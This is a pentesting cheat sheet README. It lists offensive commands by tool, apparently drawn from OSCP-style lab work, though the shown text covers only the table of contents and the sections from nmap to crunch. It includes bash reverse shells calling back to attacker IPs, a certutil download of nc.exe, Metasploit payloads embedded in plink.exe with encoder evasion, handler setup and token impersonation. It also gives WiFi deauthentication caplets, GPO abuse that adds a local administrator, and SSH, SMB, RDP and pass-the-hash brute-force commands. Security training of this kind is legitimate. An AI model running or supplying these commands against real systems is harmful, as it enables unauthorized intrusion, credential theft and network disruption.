
# Penooo-Cheatsheet for Pentesting

A collection of **useful commands and scripts** for pentesting tools, organized by the specific tools used. This repository serves as a handy reference for commonly used tools and their commands, making your pentesting tasks faster and more efficient.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Tool-Based Commands](#tool-based-commands)
  - [Nmap](#nmap)
  - [Gobuster](#gobuster)
  - [Metasploit](#metasploit)
  - [Netcat](#netcat)
  - [SearchSploit](#searchsploit)
  - [TCPDump](#tcpdump)
  - [GMSAPasswordReader](#gmsapasswordreader)
  - [GetSPN](#getspn)
  - [PowerUp](#powerup)
  - [Powerview](#powerview)
  - [PrivescCheck](#privesccheck)
  - [SharpGPOAbuse](#sharpgpoabuse)
  - [Accesschk](#accesschk)
  - [Apt](#apt)
  - [Arp](#arp)
  - [Awk](#awk)
  - [Bc](#bc)
  - [Bettercap](#bettercap)
  - [BloodHound](#bloodhound)
  - [Cadaver](#cadaver)
  - [Cat](#cat)
  - [Certutil](#certutil)
  - [Cewl](#cewl)
  - [Chisel](#chisel)
  - [Cmd](#cmd)
  - [Comm](#comm)
  - [Crackmapexec](#crackmapexec)
  - [Crowbar](#crowbar)
  - [Crunch](#crunch)
  - [Curl](#curl)
  - [Cut](#cut)
  - [Debugfs](#debugfs)
  - [Diff](#diff)
  - [Dig](#dig)
  - [Dir](#dir)
  - [Dirb](#dirb)
  - [Dnsrecon](#dnsrecon)
  - [Docker](#docker)
  - [Evil-winrm](#evil-winrm)
  - [Exiftool](#exiftool)
  - [Ffuf](#ffuf)
  - [Find](#find)
  - [Findstr](#findstr)
  - [Foremost](#foremost)
  - [Gcc](#gcc)
  - [Git](#git)
  - [Gpg](#gpg)
  - [Hashcat](#hashcat)
  - [Host](#host)
  - [Httptunnel](#httptunnel)
  - [Hydra](#hydra)
  - [Icacls](#icacls)
  - [Iconv](#iconv)
  - [Impacket](#impacket)
  - [Ip](#ip)
  - [Iptables](#iptables)
  - [John](#john)
  - [Kerberoast](#kerberoast)
  - [Ln](#ln)
  - [Ls](#ls)
  - [Man](#man)
  - [Masscan](#masscan)
  - [Medusa](#medusa)
  - [Mimikatz](#mimikatz)
  - [Mingw-64](#mingw-64)
  - [Mklink](#mklink)
  - [Mosquitto_sub](#mosquitto_sub)
  - [Mount](#mount)
  - [Msfvenom](#msfvenom)
  - [Mysql](#mysql)
  - [Nbt scan](#nbt-scan)
  - [Nc](#nc)
  - [Nessus](#nessus)
  - [Net](#net)
  - [Netsh](#netsh)
  - [Netstat](#netstat)
  - [Nslookup](#nslookup)
  - [Onesixtyone](#onesixtyone)
  - [Openssl](#openssl)
  - [Passwd](#passwd)
  - [Phpggc](#phpggc)
  - [Plink](#plink)
  - [Powercat](#powercat)
  - [Powershell](#powershell)
  - [Psexec](#psexec)
  - [Pth-winexe](#pth-winexe)
  - [Python](#python)
  - [Recon-ng](#recon-ng)
  - [Redis](#redis)
  - [Reg](#reg)
  - [Responder](#responder)
  - [Rinetd](#rinetd)
  - [Rlwrap](#rlwrap)
  - [Rpcclient](#rpcclient)
  - [Rsmangler](#rsmangler)
  - [Runas](#runas)
  - [Sc](#sc)
  - [Schtasks](#schtasks)
  - [Scp](#scp)
  - [Sed](#sed)
  - [SendEmail](#sendemail)
  - [Sharphound](#sharphound)
  - [Shellter](#shellter)
  - [Smbclient](#smbclient)
  - [Snmpwalk](#snmpwalk)
  - [Socat](#socat)
  - [Spose](#spose)
  - [Sqlmap](#sqlmap)
  - [Sqsh](#sqsh)
  - [Ssh](#ssh)
  - [Steghide](#steghide)
  - [Svn](#svn)
  - [Tail](#tail)
  - [Tar](#tar)
  - [Tasklist](#tasklist)
  - [Tcpdump](#tcpdump)
  - [Terminal](#terminal)
  - [Theharverster](#theharverster)
  - [Tr](#tr)
  - [Ufw](#ufw)
  - [Uname](#uname)
  - [Watch](#watch)
  - [Wc](#wc)
  - [Webservers](#webservers)
  - [Wfuzz](#wfuzz)
  - [Whois](#whois)
  - [Wpscan](#wpscan)
  - [Xfreerdp](#xfreerdp)
  - [Xxd](#xxd)
  - [Ysosoerial](#ysosoerial)
- [Payloads](#payloads)
  - [Cross-Site Scripting (XSS) Payloads](#xss-payloads)
  - [XML External Entity (XXE) / XML Payloads](#xml-payloads)
  - [SQL Injection (SQLi) Payloads](#sql-payloads)
  - [Antivirus (AV) Bypass](#av-bypass)
  - [Buffer Overflow (BOF) Linux (LIN)](#bof-lin)
  - [Buffer Overflow (BOF) Windows (WIN)](#bof-win)
  - [Access Control Vulnerabilities](#access-control-vulnerabilities)
  - [Active Directory (AD)](#ad)
  - [Bindshells](#bindshells)
  - [Brute Force](#brute-force)
  - [Clickjacking](#clickjacking)
  - [Cross-Origin Resource Sharing (CORS)](#cors)
  - [Cross-Site Request Forgery (CSRF)](#csrf)
  - [Database Vulnerabilities (DB)](#db)
  - [Directory Traversal (DIR)](#dir)
  - [File Transfer](#file-transfer)
  - [File Upload](#file-upload)
  - [File Transfer Protocol (FTP)](#ftp)
  - [GraphQL](#graphql)
  - [Hashing Attacks](#hash)
  - [Host Header Injection](#host-header-injection)
  - [HTML Application (HTA)](#hta)
  - [HTTP Header Attacks](#http-header)
  - [HTTP Request Smuggling](#http-request-smuggling)
  - [Internet Relay Chat (IRC)](#irc)
  - [JSON Web Token (JWT)](#jwt)
  - [Local File Inclusion (LFI)](#lfi)
  - [Macros](#macro)
  - [Network File System (NFS)](#nfs)
  - [OS command injection](#os)
  - [Other Vulnerabilities](#others)
  - [phpMyAdmin](#phpmyadmin)
  - [Privilege Escalation Linux (LIN)](#priv-lin)
  - [Privilege Escalation Windows (WIN)](#priv-win)
  - [Reverse Shells](#reverseshells)
  - [Remote File Inclusion (RFI)](#rfi)
  - [Serialization and Deserialization Vulnerabilities](#serialization-deserialization)
  - [Shellshock](#shellshock)
  - [Server Message Block (SMB)](#smb)
  - [Simple Mail Transfer Protocol (SMTP)](#smtp)
  - [Simple Network Management Protocol (SNMP)](#snmp)
  - [Server-Side Request Forgery (SSRF)](#ssrf)
  - [Server-Side Template Injection (SSTI)](#ssti)
  - [Symfony](#symfony)
  - [Trivial File Transfer Protocol (TFTP)](#tftp)
  - [Web Cache Poisoning](#web-cache-poisoning)
  - [Wireless Vulnerabilities](#wireless)
  - [wkhtmltopdf](#wkhtmltopdf)
  - [WordPress (WP)](#wp)
  - [WebSocket (WS)](#ws)
  - [XPath Injection](#xpath)
- [Shells](#shells)
  - [Reverse Shells](#reverse-shells)
  - [Bind Shells](#bind-shells)
- [Useful Resources](#useful-resources)
  - [Payloads and Exploits](#payloads-and-exploits)
  - [Pentesting Guides](#pentesting-guides)
  - [Security Tools](#security-tools)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- Comprehensive list of commands for various pentesting tools
- Pre-written scripts for automating common activities
- Beginner-friendly and updated with modern techniques

---

## Installation

Clone the repository to your local machine:

```bash
git clone https://github.com/<your-username>/cheatsheet-pentesting.git
```

Navigate to the directory:

```bash
cd cheatsheet-pentesting
```

---

## Usage

1. Browse through the tool categories to find relevant commands or scripts.
2. Use the provided commands directly in your terminal.
3. For scripts, make them executable if needed:

   ```bash
   chmod +x <script-name>.sh
   ./<script-name>.sh
   ```

4. Customize the scripts based on your specific target or environment.

---

## Tool-Based Commands

### Nmap
- **Basic Scan**:
  ```bash
  nmap -sV -A <target-IP>
  ```

- **Scan Specific Ports**:
  ```bash
  nmap -p 80,443 <target-IP>
  ```

- **OS Detection**:
  ```bash
  nmap -O <target-IP>
  ```
- **Basic full TCP Connect Scan**:
  ```bash
  nmap -sT 10.11.1.220
  ```
- **Comprehensive Service Enumeration**:
  ```bash
  sudo nmap 10.11.0.128 -p- -sV -vv --open --reason
  ```
- **MSSQL-Specific Scan**:
  ```bash
  nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 -vvv -Pn 10.11.1.31
  ```
- **Host Discovery (Network Sweep)**:
  ```bash
  nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
  grep Up ping-sweep.txt | cut -d " " -f 2
  ```
- **Web Server Discovery**:
  ```bash
  nmap -p 80 10.11.1.1-254 -oG web-sweep.txt
  grep open web-sweep.txt | cut -d" " -f2
  ```
- **Top Ports Scan**:
  ```bash
  nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt
  ```
- ** NSE OS Discovery**:
  ```bash
  nmap 10.11.1.220 --script=smb-os-discovery
  ```
- **DNS Zone Transfer**:
  ```bash
  nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
  ```
- **Exploring Nmap Scripts**:
  ```bash
  cd /usr/share/nmap/scripts/
  head -n 5 script.db
  cat script.db | grep '"vuln"\|"exploit"'
  ```
- **Vulnerability Scanning**:
  ```bash
  nmap --script=smb-vuln\* 192.168.182.40
  ```
- **UDP Scanning**:
  ```bash
  nmap -T5 -sV -sU -vvv --open 10.129.27.254
  ```

---
### Gobuster
- **Directory Enumeration**:
  ```bash
  gobuster dir -u http://<target> -w /path/to/wordlist.txt
  ```

- **DNS Subdomain Enumeration**:
  ```bash
  gobuster dns -d <target-domain> -w /path/to/wordlist.txt
  gobuster dns -d Domain.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  ```
- **Directory Search (Brute Force Directory Discovery) with Disabling SSL verification**:
  ```bash
  gobuster dir -u https://10.11.1.237/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
  ```

- **Authenticated Search (Directory Brute Forcing with Authentication) with Basic authentication**:
  ```bash
  gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u http://192.168.120.73/svn
  ```
- **Brute Force Extensions (Try Various File Extensions)**:
  ```bash
  gobuster dir -u 192.168.1.33 -x php,html,zip -t 130 -w ~/wordlists/big.txt
  ```
---
### Metasploit
- **Initializing the Metasploit Database**:
  ```bash
  sudo systemctl start postgresql
  sudo systemctl enable postgresql
  sudo msfdb init
  ```

- **Updating the Metasploit Framework**:
  ```bash
  sudo apt update; sudo apt install metasploit-framework
  ```

- **Start Metasploit Console**:
  ```bash
  msfconsole
  ```

- **Search for Exploits: Searching SMB Modules**:
  ```bash
  search <exploit-name>
  search type:auxiliary name:smb
  ```

- **Workspaces in Metasploit**:
  ```bash
  msf> workspace         # List workspaces
  msf> workspace test    # Create/switch to a workspace named "test"
  ```
- **Staged vs Non-Staged Payload Syntax**:
  ```bash
  windows/shell/reverse_tcp    #Staged Payload
  windows/shell_reverse_tcp    #Non-Staged Payload
  ```
  Staged Payload: Small payload that fetches the actual exploit in parts. Non-Staged Payload: Self-contained payload.
- **Search for Exploits**:
  ```bash
  search <exploit-name>
  ```

- **Embedding a Payload in plink.exe**:
  ```bash
  msf> generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
  ```
- **Multi/Handler Configuration**:
  ```bash
  msf> use multi/handler
  msf> set payload windows/meterpreter/reverse_https
  msf> set LHOST 192.168.118.2
  msf> set LPORT 443
  msf> exploit -j   # Run as a job
  msf> jobs -i 0    # Interact with job ID 0
  ```

- **Advanced Multi/Handler Options: Enabling staged encoding for evasion:**:
  ```bash
  msf> show advanced
  msf> set EnableStageEncoding true
  msf> set StageEncoder x86/shikata_ga_nai
  msf> set AutoRunScript windows/gather/enum_logged_on_users
  ```
- **Advanced Multi/Handler Options: Changing Meterpreter transports dynamically:**:
  ```bash
  meterpreter> transport list
  meterpreter> transport add -t reverse_tcp -l 192.168.118.2 -p 5555
  ```

- **Automating Metasploit Execution**:
  ```bash
  sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run"
  ```
- **Post-Exploitation with Incognito**:
  ```bash
  meterpreter > use incognito
  meterpreter > list_tokens -u   # List available tokens (user)
  meterpreter > impersonate_token sandbox\\Administrator
  [+] Successfully impersonated user sandbox\Administrator
  meterpreter > getuid
  Server username: sandbox\Administrator
  ```
- **Automating Metasploit Execution**:
  ```bash
  sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run"
  ```

---
### Netcat
- **Set Up a Listener**:
  ```bash
  nc -lvnp 4444
  ```

- **Send a File**:
  ```bash
  nc -w 3 <target-IP> 1234 < file.txt
  ```

- **Reverse Shell**:
  ```bash
  bash -i >& /dev/tcp/<your-IP>/4444 0>&1
  ```
- **Perform a TCP scan on ports 3388 to 3390**:
  ```bash
  nc -nvv -w 1 -z 10.11.1.220 3388-3390
  ```

- **Perform a UDP scan on ports 160 to 162**:
  ```bash
  nc -nv -u -z -w 1 10.11.1.115 160-162
  ```
---
### SearchSploit
- **Search for Exploits**:
  ```bash
  searchsploit <software-name>
  ```

- **Copy Exploit to Current Directory**:
  ```bash
  searchsploit -m <exploit-path>
  ```
---
### TCPDump
- **Capture Traffic on an Interface**:
  ```bash
  tcpdump -i <interface>
  ```

- **Write Capture to File**:
  ```bash
  tcpdump -i <interface> -w capture.pcap
  ```

- **Filter by Port**:
  ```bash
  tcpdump -i <interface> port 80
  ```
- **Using tcpdump to read packet capture**:
  ```bash
  tcpdump -r <file>
  sudo tcpdump -r password_cracking_filtered.pcap
  ```

- **Write Capture to File**:
  ```bash
  tcpdump -i <interface> -w capture.pcap
  ```

- **Using tcpdump to read the packet capture in hex/ascii output**:
  ```bash
  tcpdump -nX -r <file>
  sudo tcpdump -nX -r password_cracking_filtered.pcap
  ```
- **Capture Traffic on an Interface**:
  ```bash
  tcpdump -i <interface>
  ```

- **Using tcpdump basic filters**:
  ```bash
  sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
  sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
  sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
  sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
  sudo tcpdump -nX -r password_cracking_filtered.pcap
  ```
  -n option to skip DNS name lookups and -r to read from our packet capture file
  
- **Using tcpdump with some advanced filtering**:
  ```bash
  echo "$((2#00011000))" --> 24
  sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
  ```
  The ACK and PSH are represented by the fourth and fifth bits of the 14th byte, respectively.the tcpdump array index used for counting the bytes starts at zero, so the 
  syntax should be (tcp[13]).
  
- **sniffing with tcpdump**:
  ```bash
  tcpdump -i <interface> -A
  tcpdump -i lo -A
  ```
- **sniffing everything and saving to an output file**:
  ```bash
  tcpdump -i <interface> -w <output>
  sudo tcpdump -i any -w os.pcap
  ```
---
### GMSAPasswordReader
- **Retrieve gMSA Password**:
  ```powershell
  GMSAPasswordReader.exe <gMSA-Name>
  ```
- **Retrieving the Hash of a Service Account**:
  ```powershell
  ./GMSAPasswordReader.exe --accountname svc_apache
  ```

---

### GetSPN
- **List SPNs for a Domain**:
  ```powershell
  GetSPN -Domain <domain> -Username <username>
  ```

- **Export SPNs to File**:
  ```powershell
  GetSPN -Domain <domain> -Username <username> > spns.txt
  ```
- **Retrieving Service Names from Active Directory**:
  ```powershell
  Get-NetUser -SPN | Select-Object serviceprincipalname
  Get-NetUser -SPN | select serviceprincipalname
  ```
---

### PowerUp
- **Check Privilege Escalation Opportunities**:
  ```powershell
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks
  ```

---

### Powerview
- **Installing and Importing PowerView**:
  ```powershell
  Import-Module .\PowerView.ps1

  ```
- **List Domain Admins**:
  ```powershell
  Get-DomainAdmin
  Get-DomainGroupMember -Identity "Domain Admins"
  Get-DomainGroup | select name, member

  ```

- **Enumerate All Group Memberships**:
  ```powershell
  Get-DomainGroupMember -GroupName "Domain Admins"
  ```

- **Find Local Admins on Target Machine**:
  ```powershell
  Get-NetLocalGroupMember -Group "Administrators" -Computer <target-computer>
  ```
- **Enumerating Logged-In Users**:
  ```powershell
  Get-NetLoggedon -ComputerName client251
  Get-NetSession -ComputerName dc01

  ```
- **Enumerating Computers in the Domain**:
  ```powershell
  Get-DomainComputer | select samaccountname, name

  ```
- **Enumerating Domain Users**:
  ```powershell
  Get-DomainUser | select memberof, name

  ```
- **Recursively list all members, including nested groups:**:
  ```powershell
  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

  ```
- **Group Policy Enumeration**:
  ```powershell
  Get-NetGPO
  Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName tester

  ```
- **Hunting for Active Domain Admin Sessions**:
  ```powershell
  Invoke-UserHunter -CheckAccess

  ```
---

### PrivescCheck
- **Run Privilege Escalation Checks**:
  ```powershell
  .\PrivescCheck.ps1
  Invoke-PrivescCheck -Extended
  ```

---

### SharpGPOAbuse
- **Dump Group Policy Objects**:
  ```powershell
  SharpGPOAbuse.exe -domain <domain> -user <username> -password <password>
  ```

- **Check for GPO Misconfigurations**:
  ```powershell
  SharpGPOAbuse.exe -gpo <gpo-name> -check
  ```
- **Executing SharpGPOAbuse to add a user account (tester) to the local Administrators group by specifying the GPO**:
  ```powershell
  SharpGPOAbuse.exe --AddLocalAdmin --UserAccount tester --GPOName "Default Domain Policy"
  [+] Domain = vault.offsec
  [+] Domain Controller = DC.test.local
  [+] ...
  [+] The GPO does not specify any group memberships.
  [+] versionNumber attribute changed successfully
  [+] The version number in GPT.ini was increased successfully.
  [+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
  [+] Done!
  --> updating the local Group Policy.
  cmd> gpupdate /force
  Updating policy...
  ```

---

### accesschk
- **Check User Permissions on a File**:
  ```bash
  accesschk.exe -u <username> <file-path>
  ```

- **Check Permissions on Registry Key**:
  ```bash
  accesschk.exe -k <registry-key-path>
  ```

- **Check for Vulnerable Services to Exploit**:
  ```bash
  accesschk.exe /accepteula -uwcqv "Authenticated Users" *
  ```
  u: Check the permissions for the user or group specified.
  w: Look for write permissions.
  c: Check for the ability to change service configurations.
  q: Suppress warnings and only display the output.
  v: Verbose output.
  Authenticated Users: Specifies the target user group. This tells the tool to check permissions for all authenticated users.
  *: Checks all services on the system for the specified permissions.
---

### apt
- ** Searching for the pure-ftpd Application**:
  ```bash
  apt-cache search pure-ftpd
  ```

- **Viewing Detailed Information About the resource-agents Package**:
  ```bash
  apt show resource-agents
  ```
- **Removing the pure-ftpd Package with Configuration Files**:
  ```bash
  apt remove --purge pure-ftpd
  ```

- **Installing the man-db Application from a Local .deb File**:
  ```bash
  sudo dpkg -i man-db_2.7.0.2-5_amd64.deb
  ```

---

### arp
- **Display ARP Table**:
  ```bash
  arp -a
  ```

- **Add Static ARP Entry**:
  ```bash
  arp -s <ip-address> <mac-address>
  sudo arp -s 10.0.0.2 AA:BB:CC:DD:EE:FF
  ```
- **Deleting an ARP Entry**:
  ```bash
  sudo arp -d 10.0.0.2
  ```

- **Displaying the ARP Table in a Detailed Format**:
  ```bash
  arp -en
  ```
---

### awk
- **Print Column from File**:
  ```bash
  awk '{print $1}' <file>
  ```

- **Search for a Pattern in File**:
  ```bash
  awk '/pattern/' <file>
  ```
- **Extracting Specific Fields from a Delimited String**:
  ```bash
  echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
  ```

- **Using awk with a Unique Delimiter to Process HTML Links**:
  ```bash
  grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpone\.com" | awk -F "http://" '{print $2}'
  ```
---

### bc
- **Basic Arithmetic**:
  ```bash
  echo "3 + 4" | bc
  ```

- **Square Root Calculation**:
  ```bash
  echo "sqrt(16)" | bc
  ```
- ** Converting a Binary Number to Decimal**:
  ```bash
  echo "ibase=2;11111" | bc
  ```

- **Converting a Decimal Number to Binary**:
  ```bash
  echo "obase=2;7" | bc
  ```
---

### bettercap
- **Start Sniffing on Interface**:
  ```bash
  bettercap -iface <interface> -caplet http-server
  sudo bettercap -iface wlan0
  ```

- **Enable HTTP Proxy**:
  ```bash
  bettercap -iface <interface> -proxy
  ```
- **Wi-Fi Reconnaissance**:
  ```bash
  wlan0 » wifi.recon on
  wlan0 » wifi.recon.channel 6,11
  wlan0 » wifi.show

  ```

- **Use Ticker to Continuously Display Data:**:
  ```bash
  wlan0 » set ticker.commands "clear; wifi.show"
  wlan0 » wifi.recon on
  wlan0 » ticker on

  ```
- **Automate Commands at Startup:**:
  ```bash
  sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"

  ```

- **Filtering and Targeting**:
  ```bash
  wlan0 » wifi.recon c6:2d:56:2a:53:f8
  wlan0 » wifi.show
  wlan0 » set wifi.show.filter ^c0
  wlan0 » wifi.show


  ```
- **Reset Filters and Set RSSI Threshold:**:
  ```bash
  wlan0 » set wifi.show.filter ""
  wlan0 » set wifi.rssi.min -49
  wlan0 » wifi.show

  ```

- **Deauthentication Attacks**:
  ```bash
  wlan0 » wifi.deauth c6:2d:56:2a:53:f8

  ```
- **Handling Handshakes**:
  ```bash
  wlan1 » wifi.recon off
  wlan1 » get wifi.handshakes.file 
  wlan0 » set wifi.handshakes.file "/home/kali/handshakes/"
  wlan0 » set wifi.handshakes.aggregate false
  wlan0 » wifi.recon on

  ```

- **Capture Handshake:**:
  ```bash
  wlan0 » wifi.deauth c6:2d:56:2a:53:f8
  -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /home/kali/handshakes/Corporate_405d82dcb210.pcap

  ```
- **Skipping Specific BSSIDs**:
  ```bash
  wlan0 » set wifi.deauth.skip ac:22:0b:28:fd:22
  wlan0 » wifi.deauth c6:2d:56:2a:53:f8

  ```

- **Automating Deauthentication Using Caplets**:
  ```bash
  kali@kali:/usr/share/bettercap/caplets$ cat -n massdeauth.cap
  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}

  ```
- **Custom Deauthentication Caplet for "Corporate":**:
  ```bash
  bettercap -iface <interface> -caplet http-server
  ```

- **Enable HTTP Proxy**:
  ```bash
  bettercap -iface <interface> -proxy
  ```
- **Start Sniffing on Interface**:
  ```bash
  kali@kali:~$ cat -n deauth_corp.cap 
  1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
  2
  3  set ticker.period 10
  4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
  5
  6  events.ignore wifi.ap.new
  7  events.ignore wifi.client.probe
  8  events.ignore wifi.client.new
  9
  10  wifi.recon on
  11  ticker on
  12  events.clear
  13  clear

  ```

- **Run the Custom Caplet:**:
  ```bash
  sudo bettercap -iface wlan0 -caplet deauth_corp.cap
  ```
---

### bloodHound
- **Installing BloodHound**:
  ```bash
  sudo apt-get update
  sudo apt-get install bloodhound
  ```

  - **Starting and Configuring the Neo4j Database for BloodHound**:
  ```bash
  sudo neo4j console
  ```
  
- **Import Data into BloodHound**:
  ```bash
  BloodHound -c <config-file> -i <input-file>
  ```

- **Run BloodHound Enumeration**:
  ```bash
  BloodHound -c <config-file> -u <username> -p <password>
  ```

---

### cadaver
- **Connect to WebDAV Server**:
  ```bash
  cadaver <url>
  ```

- **List Files in Directory**:
  ```bash
  ls
  ```
  
- **Authenticating and Interacting with WebDAV Using Cadaver**:
  ```bash
  cadaver http://fakeserver.local/webdav/
  ```
---

### cat
- **View File Content**:
  ```bash
  cat <file-path>
  ```

- **Concatenate Multiple Files**:
  ```bash
  cat <file1> <file2>
  ```
- ** Reading a File with Line Numbers**:
  ```bash
  cat -n file
  ```

- **Creating a Reverse Shell Script using (`cat <<EOF ... EOF`) method**:
  ```bash
  cat <<EOF>> ./reverse-shell
  heredoc> #!/bin/bash
  heredoc>/bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
  heredoc>EOF
  ```
---

### certutil
- **Check Certificate Information**:
  ```bash
  certutil -dump <certificate-file>
  ```

- **Export Certificate**:
  ```bash
  certutil -exportPFX -user <certificate-name> <output-file>
  ```
- **Calculating the SHA-256 Hash of a File**:
  ```bash
  certutil -hashfile <file> sha256
  ```

- **Downloading a File Using Certutil**:
  ```bash
  certutil.exe -urlcache -f <url> <file>
  certutil.exe -urlcache -f http://192.168.119.156/nc.exe nc.exe
  ```

---

### cewl
- **Create Custom Wordlist from URL**:
  ```bash
  cewl <url> -w <output-file>
  ```

- **Create Wordlist from Specific Lengths**:
  ```bash
  cewl <url> -w <output-file> -l <min-length> -l <max-length>
  ```
- **Generating a Wordlist from a Website Using CeWL: `-m 6` Specifies the minimum word length**:
  ```bash
  cewl <url> -m <min-word-length> -w <output-file>
  cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
  ```

---

### chisel
- **Start a Local HTTP Proxy**:
  ```bash
  chisel server -p <port> --reverse
  ```

- **Connect to Remote HTTP Proxy**:
  ```bash
  chisel client <remote-server>:<remote-port> <local-port>:http
  ```
- **Setting Up Chisel Server/client for Remote Forwarding**:
  ```bash
  chisel server --reverse --port 9002
  chisel.exe client 192.168.119.125:9002 192.168.119.125:445 R:445:localhost:445
  ```
- **Example of General Port Forwarding**:
  ```bash
  ./chisel server -p 8083 --reverse
  ./chisel client 192.168.1.99:8083 R:6379:127.0.0.1:6379
  
  ```
- **Example: Forwarding MSSQL(Server)**:
  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ chisel server -p 8000 --reverse
  2022/03/21 14:21:59 server: Reverse tunnelling enabled
  2022/03/21 14:21:59 server: Fingerprint YqJoP81ML0mrD3p2Mhd+Ix6WRr1Wb7e61RFzukVAP3Q=
  2022/03/21 14:21:59 server: Listening on http://0.0.0.0:8000
  ```

- **Example: Forwarding MSSQL(Client)**:
  ```bash
  PS C:\xampp\htdocs\tmp\> .\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
  chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
  2022/03/21 11:17:46 client: Connecting to ws://192.168.118.23:8000
  2022/03/21 11:17:47 client: Connected (Latency 201.072ms)
  ```

---

### cmd
- **Open Command Prompt**:
  ```bash
  cmd
  ```

- **Run Command in Command Prompt**:
  ```bash
  cmd /c <command>
  ```
- **Using forfiles to Find the Path of a file e.g. notepad.exe**:
  ```bash
  forfiles /P C:\Windows /S /M notepad.exe /c "cmd /c echo @PATH"
  ```

- **Activating RDP (Remote Desktop Protocol)**:
  ```bash
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  ```
- **Searching for Files Using `where`**:
  ```bash
  where /r C:\ fodhelper.exe
  ```
---

### comm
- **Compare Two Files**:
  ```bash
  comm <file1> <file2>
  ```

- **Suppress Column from Output**:
  ```bash
  comm -23 <file1> <file2>
  ```

---

### crackmapexec
- **Enumerate SMB Shares**:
  ```bash
  crackmapexec smb <target-ip> -u <username> -p <password> --shares
  ```

- **Run Commands on Target Machines**:
  ```bash
  crackmapexec smb <target-ip> -u <username> -p <password> -x "<command>"
  ```
- **Brute Force SSH on a Range of IPs**:
  ```bash
  crackmapexec ssh <target-ip-range> -u <username> -p <password> 
  crackmapexec ssh 10.11.1.0-254 -u user -p password
  ```

- **Brute Force SMB with a NTLM Hash on a Range of IPs**:
  ```bash
  crackmapexec smb <target-ip-range> -u <username> -H <NTLM>
  crackmapexec smb 10.11.1.1-200 -u user -H "aad3b41233433234435b51404ee:2d518fe2e4353259eae5db1"
  ```
- **Brute Force WinRM with Usernames and Hashs**:
  ```bash
  crackmapexec winrm <target-ip> -u <file> -H <file>
  crackmapexec winrm 192.168.155.175 -u users.txt -H hash.txt
  ```

### crowbar
- **Brute Force SMB Login**:
  ```bash
  crowbar smb -b <ip-address> -u <username> -p <password-list>
  ```

- **Brute Force SSH Login**:
  ```bash
  crowbar ssh -b <ip-address> -u <username> -p <password-list>
  ```
- **Brute Force RDP Login**:
  ```bash
  crowbar -b RDP -S <ip-address> -u <username> -C <password-list> -n 1
  crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
  ```
  `-n 1`: Limits the attack to use 1 thread for the brute-force attempt (you can increase the number for faster attacks, but with caution).
---

### crunch
- **Generate Wordlist of Given Lengths**:
  ```bash
  crunch <min-length> <max-length> -o <output-file>
  crunch 4 6 0123456789ABCDEF -o crunch.txt
  ```

- **Generate Wordlist with Custom Characters**:
  ```bash
  crunch 8 8 -t ,@@^^%%%
  #@	Lower case alpha characters
  #,	Upper case alpha characters
  #%	Numeric characters
  #^	Special characters including space
  ```
- **Generating password list of lower and upper case letters:**:
  ```bash
  crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
  crunch 11 11  -f /usr/share/crunch/charset.lst lalpha -t  buddy%%%%^^ -o buddy.txt
  ```
- **Using Crunch to generate wordlist with the charset abc123 with word between 8 and 9 characters:**:
  ```bash
  crunch 8 9 abc123
  ```
- **Using Crunch to generate wordlist with starting with password and ending with three digits:**:
  ```bash
  crunch 11 11 -t password%%%
  ```
- **Using Crunch to generate wordlist starting with 'password' and ending with three digits - Alternate version:**:
  ```bash
  crunch 11 11 0123456789 -t password@@@
  ```
- **Using Crunch to generate wordlist using characters in 'abcde12345' without repeating any of them:**:
  ```bash
  crunch 1 1 -p abcde12345
  ```
- **Using Crunch to generate wordlist with multiple words instead of characters, without repeating them:**:
  ```bash
  crunch 1 1 -p dog cat bird
  ```
- **Using Crunch to generate wordlist with multiple words instead of characters, without repeating them and adding two digits:**:
  ```bash
  crunch 5 5 -t ddd%% -p dog cat bird
  ```
